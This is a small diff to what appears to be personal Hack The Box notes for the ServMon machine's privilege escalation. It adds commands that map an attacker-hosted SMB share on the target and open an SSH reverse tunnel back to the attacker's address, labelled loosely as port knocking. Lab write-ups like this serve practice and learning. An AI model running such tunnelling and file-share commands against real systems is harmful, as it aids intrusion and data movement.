@@ -141,5 +141,7 @@ I need to port forward here.
 └─# service ssh start
 Open an smb local server just in case 
 └─# python smbserver.py share `pwd` -smb2support
+net use Z: \\10.10.14.11\share
+Port knocking : ssh -N -R 10.10.14.11:8443:127.0.0.1:8443 joe@10.10.14.11
 
 Reference: https://blog.luckolen.xyz/posts/HTB/ServMon#privilege-escalation
